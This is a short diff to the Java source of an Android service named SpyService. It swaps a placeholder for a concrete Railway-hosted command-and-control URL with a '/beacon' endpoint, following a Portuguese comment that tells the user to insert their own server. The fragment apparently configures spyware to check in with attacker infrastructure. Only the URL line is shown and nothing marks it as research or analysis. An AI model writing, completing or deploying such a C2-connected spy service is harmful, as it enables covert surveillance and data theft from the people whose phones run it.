@@ -14,7 +14,7 @@ import java.nio.charset.StandardCharsets;
 
 public class SpyService extends Service {
     // COLOQUE A URL DO SEU SERVIDOR RAILWAY AQUI EMBAIXO
-    private static final String C2_URL = "SUBSTITUA_PELA_URL_DO_SEU_RAILWAY/beacon";
+    private static final String C2_URL = "https://kjstyk-tob-production.up.railway.app/beacon";
     private Handler handler = new Handler();
 
     @Override
